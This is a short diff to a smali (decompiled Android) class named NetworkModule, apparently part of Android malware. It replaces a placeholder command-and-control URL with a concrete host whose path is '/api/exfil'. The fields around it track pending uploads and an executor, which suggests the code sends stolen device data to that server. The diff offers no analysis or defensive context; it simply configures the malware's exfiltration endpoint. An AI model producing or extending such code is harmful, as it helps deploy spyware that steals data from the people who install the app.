@@ -2,7 +2,7 @@
 .super Ljava/lang/Object;
 .source "NetworkModule.java"
 
-.field private static final C2_URL:Ljava/lang/String; = "https://your_c2_server.com/api/exfil"
+.field private static final C2_URL:Ljava/lang/String; = "https://smilex-c2.onrender.com/api/exfil"
 .field private static sPendingUploads:Ljava/util/List; = null
 .field private static final sPendingLock:Ljava/lang/Object; = null
 .field private static sExecutor:Ljava/util/concurrent/ExecutorService; = null
